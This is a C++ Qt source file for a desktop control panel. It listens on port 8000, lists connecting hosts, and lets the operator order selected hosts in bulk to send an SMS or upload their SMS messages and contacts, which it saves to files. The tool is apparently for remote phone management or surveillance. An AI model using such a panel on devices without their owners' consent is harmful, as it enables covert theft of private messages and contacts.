#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QJsonDocument>
#include <QJsonArray>
#include <QJsonObject>
#include <QDateTime>
#include <QFile>
#include <QDir>
#include <QTextStream>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    init();
    initView();
    updateView();
    mSessionManager.start(8000);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::init()
{
    QObject::connect(&mSessionManager,SIGNAL(onNewSession(NetworkSession*)),this,SLOT(handleNewSession(NetworkSession*)));
}

void MainWindow::initView()
{
    QObject::connect(&mSessionManager, SIGNAL(onIncomeHost(QString,QHostAddress,quint16)), &mModel, SLOT(putItem(QString,QHostAddress,quint16)));
    QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
    ui->tableView->setModel(&mModel);
    ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
    ui->tableView->resizeColumnToContents(0);

    QAction *aAll,*aNone,*aReverse;
    ui->tableView->addAction(aAll = new QAction(QString("Select All"),ui->tableView));
    ui->tableView->addAction(aNone = new QAction(QString("unSelect All"),ui->tableView));
    ui->tableView->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableView));

    QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
    QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
    QObject::connect(aReverse,SIGNAL(triggered()),&mModel,SLOT(reverseSelect()));

    QAction *separator = new QAction(QString(),ui->tableView);
    separator->setSeparator(true);
    ui->tableView->addAction(separator);


    QAction *aSendSms,*aLoadContact,*aLoadSms;
    ui->tableView->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableView));
    ui->tableView->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
    ui->tableView->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));

    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
}

void MainWindow::updateView()
{
    ui->hostCountLabel->setText(QString("Host: %1").arg(mModel.rowCount()));
}

void MainWindow::handleNewSession(NetworkSession* networkSession)
{
    QObject::connect(networkSession->socket(),SIGNAL(error(QAbstractSocket::SocketError)),networkSession,SLOT(deleteLater()));
    QObject::connect(networkSession,SIGNAL(onReadData(NetworkSession*,QByteArray)),this,SLOT(handleReceiveData(NetworkSession*,QByteArray)));

    QJsonObject jsonObject;
    QJsonDocument jsonDocument;

    jsonObject.insert(QString("action"), networkSession->getSessionName());

    // add extra data
    if(networkSession->getSessionName()==ACTION_SEND_SMS)
    {
        jsonObject.insert(QString("content"), QString("呵呵"));
        jsonDocument.setObject(jsonObject);
        networkSession->write(jsonDocument.toJson());
        networkSession->deleteLater();
    }
    else if(networkSession->getSessionName()==ACTION_UPLOAD_SMS || networkSession->getSessionName()==ACTION_UPLOAD_CONTACT)
    {
        jsonDocument.setObject(jsonObject);
        networkSession->write(jsonDocument.toJson());
    }
    else
    {
        networkSession->deleteLater();
        return;
    }
}

void MainWindow::handleReceiveData(NetworkSession* networkSession, QByteArray data)
{
    QString fileName = QDateTime::currentDateTime().toString("yyyy-MM-dd_hh,mm,ss") + "_" + networkSession->getSessionUuid() + ".txt";
    QDir().mkpath(networkSession->getSessionName());
    QFile file(networkSession->getSessionName() + "/" + fileName);
    file.open(QFile::WriteOnly);
    QTextStream stream(&file);
    stream << data;
    file.flush();
    file.close();
    networkSession->deleteLater();
}

void MainWindow::sendSms()
{
    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_SEND_SMS);
}
void MainWindow::loadSms()
{
    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_SMS);
}
void MainWindow::loadContact()
{
    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_CONTACT);
}
